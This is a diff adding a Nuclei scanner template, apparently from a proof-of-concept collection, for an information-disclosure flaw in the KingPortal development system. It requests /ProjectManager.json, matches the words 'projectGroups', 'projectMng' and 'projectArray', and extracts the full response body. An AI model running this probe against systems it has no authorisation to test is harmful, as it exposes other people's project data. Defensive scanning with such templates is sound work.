@@ -1,0 +1,27 @@
+id: KingPortal-leaks-ProjectManager
+
+info:
+  name: KingPortal开发系统-信息泄露
+  author: ghosinshell
+  severity: critical
+  description: KingPortal开发系统-信息泄露（项目信息）
+  tags: KingPortal开发系统, KingPortal, 项目信息泄漏
+  reference: https://github.com/ghosinshell/Nuclei-POC
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ProjectManager.json"
+
+    matchers:
+      - type: word
+        words:
+          - "projectGroups"
+          - "projectMng"
+          - "projectArray"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(.*)"  
